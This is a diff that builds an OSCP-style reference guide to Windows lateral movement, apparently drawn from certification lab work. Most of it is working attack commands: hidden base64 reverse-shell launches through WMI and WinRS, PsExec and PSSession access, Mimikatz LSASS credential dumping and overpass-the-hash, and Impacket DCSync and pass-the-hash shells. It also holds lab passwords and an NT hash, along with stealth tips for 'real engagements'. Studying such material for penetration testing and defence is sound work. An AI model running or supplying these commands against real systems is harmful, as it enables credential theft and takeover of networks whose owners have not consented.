@@ -1,11 +1,17 @@
-#ON WINDOWS MACHINE.
-#################################
-################################## WMI Lateral Movement (DCOM) — PowerShell
-###################################
+===========================================================================
+                    LATERAL MOVEMENT NOTES
+                      OSCP Reference Guide
+===========================================================================
+
+
+===========================================================================
+  [1] WMI LATERAL MOVEMENT (DCOM) — PowerShell
+      Protocol: DCOM/135 | No interactive shell | Executes remote process
+===========================================================================
 
 # Step 1 — Set credentials
-$username = '';
-$password = '';
+$username = 'corp\jen';
+$password = 'Nexus123!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
@@ -13,51 +19,193 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 $Options = New-CimSessionOption -Protocol DCOM
 
 # Step 3 — Create the CimSession to target machine
-$Session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $Options
+$Session = New-CimSession -ComputerName <TARGET-IP> -Credential $credential -SessionOption $Options
 
-# Step 4 — Execute command on remote machine (base64 encoded payload)
+# Step 4 — Set base64 encoded reverse shell payload
 $Command = 'powershell -nop -w hidden -e <base64_encoded_payload>';
 
 # Step 5 — Invoke it via WMI
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command};
 
-##########################
-#############################    WinRS Lateral Movement
-##########################
- 
-# Step 1 — Test command execution on remote machine
-winrs -r:SERVER -u:user -p:<PASSWORD>! "cmd /c hostname & whoami"
+# Confirm success — look for ReturnValue = 0:
+# ProcessId  ReturnValue  PSComputerName
+# ---------  -----------  --------------
+# 3548       0            192.168.x.x
 
-# Output confirms execution as:
-#SERVER
-# corp\user
+# NOTES:
+# - ReturnValue 0 = process successfully spawned on remote machine
+# - Payload must be base64 encoded to avoid escaping issues
+# - Good alternative when SMB/WinRM is blocked
 
-# Step 2 — Send reverse shell payload via WinRS
-winrs -r:SERVER -u:user -p:PASSWORD "powershell -nop -w hidden -e <base64_encoded_payload>"
 
-######################################################
-#################################
-##################################  PSSession Lateral Movement (WinRM)
+===========================================================================
+  [2] WINRS LATERAL MOVEMENT
+      Protocol: WinRM/5985 | One-liner execution | No interactive shell
+===========================================================================
 
+# Step 1 — Test command execution first
+winrs -r:<SERVER> -u:<user> -p:<password> "cmd /c hostname & whoami"
+
+# Expected output:
+# FILES04
+# corp\jen
+
+# Step 2 — Send reverse shell payload
+winrs -r:<SERVER> -u:<user> -p:<password> "powershell -nop -w hidden -e <base64_encoded_payload>"
+
+# NOTES:
+# - Use FQDN if getting Kerberos errors: -r:files04.corp.com
+# - Requires WinRM to be enabled on target
+# - Simpler syntax than PSSession but not interactive
+
+
+===========================================================================
+  [3] PSSESSION LATERAL MOVEMENT (WinRM)
+      Protocol: WinRM/5985 | INTERACTIVE shell | Full PowerShell prompt
+===========================================================================
 
 # Step 1 — Set credentials
-$username = 'user';
-$password = 'password!';
+$username = 'jen';
+$password = 'Nexus123!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 
 # Step 2 — Create remote session
-New-PSSession -ComputerName <IP>-Credential $credential
+New-PSSession -ComputerName <TARGET-IP> -Credential $credential
 
 # Output confirms session opened:
 # Id  Name    ComputerName    State   ConfigurationName
-# 1   WinRM1  192.168..0.1  Opened  Microsoft.PowerShell
+# 1   WinRM1  192.168.x.x     Opened  Microsoft.PowerShell
 
 # Step 3 — Enter the session interactively
 Enter-PSSession 1
 
 # Now you're on the remote machine!
-# [192.168.xx]: PS C:\Users\jen\Documents> whoami
-# corp\user
-# [192.168.xx]: PS C:\Users\jen\Documents> hostname
-# SERVER
+# [192.168.x.x]: PS C:\Users\jen\Documents> whoami
+# corp\jen
+# [192.168.x.x]: PS C:\Users\jen\Documents> hostname
+# FILES04
+
+# NOTES:
+# - Most interactive of all WinRM methods
+# - Use FQDN if getting Kerberos/SPN errors
+# - Great for hands-on enumeration once inside
+
+
+===========================================================================
+  [4] PSEXEC LATERAL MOVEMENT — Sysinternals (Windows)
+      Protocol: SMB/445 | Interactive shell | Drops a service binary
+===========================================================================
+
+# Basic interactive shell
+.\PsExec64.exe -i \\<TARGET> -u corp\<user> -p <password> cmd
+
+# Example:
+.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+
+# Flags:
+# -i   = interactive session
+# -u   = domain\username
+# -p   = password
+# \\   = target hostname (two backslashes)
+
+# NOTES:
+# - Requires admin rights on target
+# - Noisier than WMI — creates and starts a service
+# - Good for Windows-to-Windows lateral movement
+
+
+===========================================================================
+  [5] OVERPASS-THE-HASH — Mimikatz (Windows)
+      Use NT hash to generate a Kerberos TGT and move laterally
+===========================================================================
+
+# Step 1 — Run Mimikatz and get privileges
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords       <- dump hashes from LSASS
+
+# Step 2 — Perform Overpass-the-Hash
+mimikatz # sekurlsa::pth /user:<user> /domain:corp.com /ntlm:<NThash> /run:powershell
+
+# A new PowerShell window opens running as that user
+# Step 3 — Generate a Kerberos ticket by accessing a network resource
+net use \\<TARGET>
+
+# Step 4 — Verify ticket was created
+klist
+
+# Step 5 — Move laterally
+Enter-PSSession -ComputerName <TARGET>
+# OR
+.\PsExec64.exe -i \\<TARGET> cmd
+
+# NOTES:
+# - Converts NT hash into a Kerberos TGT (unlike Pass-the-Hash which uses NTLM)
+# - Requires SeDebugPrivilege (privilege::debug)
+# - The new PowerShell window inherits the identity of the target user
+
+
+===========================================================================
+  [6] PASS-THE-HASH / OVERPASS-THE-HASH — Impacket (Kali)
+      Use NT hash directly from Linux to move laterally
+===========================================================================
+
+# --- Get NT Hash via DCSync ---
+impacket-secretsdump corp.com/<admin>:'<password>'@<DC-IP>
+# Hash format in output:
+# username:RID:lmhash:NThash:::
+# Example:
+impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.151.70
+
+# --- psexec with password ---
+impacket-psexec corp.com/<user>:'<password>'@<target-IP>
+
+# --- psexec with NT hash ---
+impacket-psexec -hashes :<NThash> corp.com/<user>@<target-IP>
+
+# --- wmiexec with password (stealthier — no binary drop) ---
+impacket-wmiexec corp.com/<user>:'<password>'@<target-IP>
+
+# --- wmiexec with NT hash ---
+impacket-wmiexec -hashes :<NThash> corp.com/<user>@<target-IP>
+
+# Real example:
+/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+# --- smbexec with password (no binary drop) ---
+impacket-smbexec corp.com/<user>:'<password>'@<target-IP>
+
+# --- Grab the flag once you have a shell ---
+type C:\Users\Administrator\Desktop\flag.txt
+
+
+===========================================================================
+  TOOL COMPARISON
+===========================================================================
+
+  Method              | Tool          | Protocol    | Interactive | Stealthy
+  --------------------|---------------|-------------|-------------|----------
+  WMI/CimSession      | PowerShell    | DCOM/135    | No          | Medium
+  WinRS               | Built-in      | WinRM/5985  | No          | Medium
+  PSSession           | PowerShell    | WinRM/5985  | YES         | Medium
+  PsExec (Windows)    | Sysinternals  | SMB/445     | Yes         | Low
+  impacket-psexec     | Kali          | SMB/445     | Yes         | Low
+  impacket-wmiexec    | Kali          | WMI         | Yes         | High
+  impacket-smbexec    | Kali          | SMB/445     | Yes         | Medium
+
+
+===========================================================================
+  KEY NOTES & TIPS
+===========================================================================
+
+  - Use single quotes in bash for passwords containing ! (e.g. 'Pass123!')
+  - LM hash is always blank: use -hashes :NThash (not LM:NT)
+  - Use DC IP for secretsdump, TARGET IP for psexec/wmiexec
+  - wmiexec is stealthier than psexec — preferred for real engagements
+  - NT hash can be upper or lowercase — both work
+  - If WinRM gives Kerberos errors, try FQDN instead of hostname or IP
+  - ReturnValue 0 in WMI = success
+  - Use klist to verify Kerberos tickets after Overpass-the-Hash
+  - privilege::debug required before any Mimikatz credential operations
+
+===========================================================================
